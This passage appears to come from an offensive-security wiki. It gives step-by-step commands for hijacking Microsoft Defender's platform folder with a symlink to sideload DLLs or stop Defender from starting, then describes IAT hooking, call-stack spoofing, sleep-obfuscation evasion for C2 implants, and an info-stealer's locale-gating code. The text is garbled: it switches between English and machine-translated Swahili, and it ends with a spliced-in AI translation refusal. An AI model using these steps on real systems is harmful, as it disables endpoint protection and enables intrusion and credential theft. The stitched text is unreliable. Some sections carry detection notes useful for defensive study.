## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- Local Administrator (needed to create directories/symlinks under the Platform folder)
- Ability to reboot or trigger Defender platform re-selection (service restart on boot)
- Only built-in tools required (mklink)

Why it works
- Defender blocks writes in its own folders, but its platform selection trusts directory entries and picks the lexicographically highest version without validating that the target resolves to a protected/trusted path.

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Unda symlink wa saraka ya toleo la juu ndani ya Platform unaoelekezwa kwa saraka yako:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Uchaguzi wa kichocheo (kupendekezwa kuanzisha upya):
```cmd
shutdown /r /t 0
```
4) Thibitisha MsMpEng.exe (WinDefend) inaendesha kutoka kwenye njia iliyohamishwa:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
You should observe the new process path under `C:\TMP\AV\` and the service configuration/registry reflecting that location.

Post-exploitation options
- DLL sideloading/code execution: Weka/ibadilisha DLLs ambazo Defender huipakia kutoka kwenye application directory yake ili kutekeleza code katika michakato ya Defender. See the section above: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Ondoa version-symlink ili kwenye startup ijayo configured path isiweze kutatuliwa na Defender ashindwe kuanza:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Kumbuka kwamba mbinu hii haitoi privilege escalation yenyewe; inahitaji admin rights.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams zinaweza kuhamisha runtime evasion kutoka kwenye C2 implant na kuiweka ndani ya module lengwa yenyewe kwa ku-hook Import Address Table (IAT) yake na kupitisha selected APIs kupitia attacker-controlled, position‑independent code (PIC). Hii inapanua evasion zaidi ya uso mdogo wa API ambao kits nyingi zinaonyesha (e.g., CreateProcessA), na inaeneza ulinzi huo kwa BOFs na post‑exploitation DLLs.

Mbinu za kiwango cha juu
- Stage a PIC blob alongside the target module using a reflective loader (prepended or companion). The PIC must be self‑contained and position‑independent.
- As the host DLL loads, walk its IMAGE_IMPORT_DESCRIPTOR and patch the IAT entries for targeted imports (e.g., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) to point at thin PIC wrappers.
- Each PIC wrapper executes evasions before tail‑calling the real API address. Typical evasions include:
- Memory mask/unmask around the call (e.g., encrypt beacon regions, RWX→RX, change page names/permissions) then restore post‑call.
- Call‑stack spoofing: construct a benign stack and transition into the target API so call‑stack analysis resolves to expected frames.
- For compatibility, export an interface so an Aggressor script (or equivalent) can register which APIs to hook for Beacon, BOFs and post‑ex DLLs.

Kwanini IAT hooking hapa
- Inafanya kazi kwa code yoyote inayotumia hooked import, bila kuharibu tool code au kutegemea Beacon ku-proxy specific APIs.
- Inafunika post‑ex DLLs: hooking LoadLibrary* inakuwezesha ku-intercept module loads (e.g., System.Management.Automation.dll, clr.dll) na kutumia masking/stack evasion sawa kwa API calls zao.
- Inarejesha matumizi ya kuaminika ya process‑spawning post‑ex commands dhidi ya call‑stack–based detections kwa ku-wrap CreateProcessA/W.

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Apply the patch after relocations/ASLR and before first use of the import. Reflective loaders like TitanLdr/AceLdr demonstrate hooking during DllMain of the loaded module.
- Keep wrappers tiny and PIC-safe; resolve the true API via the original IAT value you captured before patching or via LdrGetProcedureAddress.
- Use RW → RX transitions for PIC and avoid leaving writable+executable pages.

Call‑stack spoofing stub
- Draugr‑style PIC stubs build a fake call chain (return addresses into benign modules) and then pivot into the real API.
- This defeats detections that expect canonical stacks from Beacon/BOFs to sensitive APIs.
- Pair with stack cutting/stack stitching techniques to land inside expected frames before the API prologue.

Operational integration
- Prepend the reflective loader to post‑ex DLLs so the PIC and hooks initialise automatically when the DLL is loaded.
- Use an Aggressor script to register target APIs so Beacon and BOFs transparently benefit from the same evasion path without code changes.

Detection/DFIR considerations
- IAT integrity: entries that resolve to non‑image (heap/anon) addresses; periodic verification of import pointers.
- Stack anomalies: return addresses not belonging to loaded images; abrupt transitions to non‑image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in‑process writes to IAT, early DllMain activity that modifies import thunks, unexpected RX regions created at load.
- Image‑load evasion: if hooking LoadLibrary*, monitor suspicious loads of automation/clr assemblies correlated with memory masking events.

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks via a resident PICO

If you control a reflective loader, you can hook imports **during** `ProcessImports()` by replacing the loader's `GetProcAddress` pointer with a custom resolver that checks hooks first:

- Build a **resident PICO** (persistent PIC object) that survives after the transient loader PIC frees itself.
- Export a `setup_hooks()` function that overwrites the loader's import resolver (e.g., `funcs.GetProcAddress = _GetProcAddress`).
- In `_GetProcAddress`, skip ordinal imports and use a hash-based hook lookup like `__resolve_hook(ror13hash(name))`. If a hook exists, return it; otherwise delegate to the real `GetProcAddress`.
- Register hook targets at link time with Crystal Palace `addhook "MODULE$Func" "hook"` entries. The hook stays valid because it lives inside the resident PICO.

This yields **import-time IAT redirection** without patching the loaded DLL's code section post-load.

### Forcing hookable imports when the target uses PEB-walking

Import-time hooks only trigger if the function is actually in the target's IAT. If a module resolves APIs via a PEB-walk + hash (no import entry), force a real import so the loader's `ProcessImports()` path sees it:

- Replace hashed export resolution (e.g., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) with a direct reference like `&WaitForSingleObject`.
- The compiler emits an IAT entry, enabling interception when the reflective loader resolves imports.

### Ekko-style sleep/idle obfuscation without patching `Sleep()`

Instead of patching `Sleep`, hook the **actual wait/IPC primitives** the implant uses (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). For long waits, wrap the call in an Ekko-style obfuscation chain that encrypts the in-memory image during idle:

- Use `CreateTimerQueueTimer` to schedule a sequence of callbacks that call `NtContinue` with crafted `CONTEXT` frames.
- Typical chain (x64): set image to `PAGE_READWRITE` → RC4 encrypt via `advapi32!SystemFunction032` over the full mapped image → perform the blocking wait → RC4 decrypt → **restore per-section permissions** by walking PE sections → signal completion.
- `RtlCaptureContext` provides a template `CONTEXT`; clone it into multiple frames and set registers (`Rip/Rcx/Rdx/R8/R9`) to invoke each step.

Operational detail: return “success” for long waits (e.g., `WAIT_OBJECT_0`) so the caller continues while the image is masked. This pattern hides the module from scanners during idle windows and avoids the classic “patched `Sleep()`” signature.

Detection ideas (telemetry-based)
- Bursts of `CreateTimerQueueTimer` callbacks pointing to `NtContinue`.
- `advapi32!SystemFunction032` used on large contiguous image-sized buffers.
- Large-range `VirtualProtect` followed by custom per-section permission restoration.


## SantaStealer Tradecraft for Fileless Evasion and Credential Theft

SantaStealer (aka BluelineStealer) illustrates how modern info-stealers blend AV bypass, anti-analysis and credential access in a single workflow.

### Keyboard layout gating & sandbox delay

- A config flag (`anti_cis`) enumerates installed keyboard layouts via `GetKeyboardLayoutList`. If a Cyrillic layout is found, the sample drops an empty `CIS` marker and terminates before running stealers, ensuring it never detonates on excluded locales while leaving a hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
Sorry — I can’t help translate content that provides operational instructions for malware, AV/EDR bypass, credential theft, or data exfiltration. Translating those technical details would meaningfully facilitate wrongdoing.

I can, however, help with safe alternatives:
- Provide a high-level summary in Swahili that focuses on defensive implications, detection indicators, and mitigation recommendations (non-actionable).
- Translate only benign parts (e.g., generic reference titles) or redact technical steps and translate the rest.
- Reframe the content into a security guidance document in Swahili for defenders (hardening, monitoring, incident response).

Which option would you like?
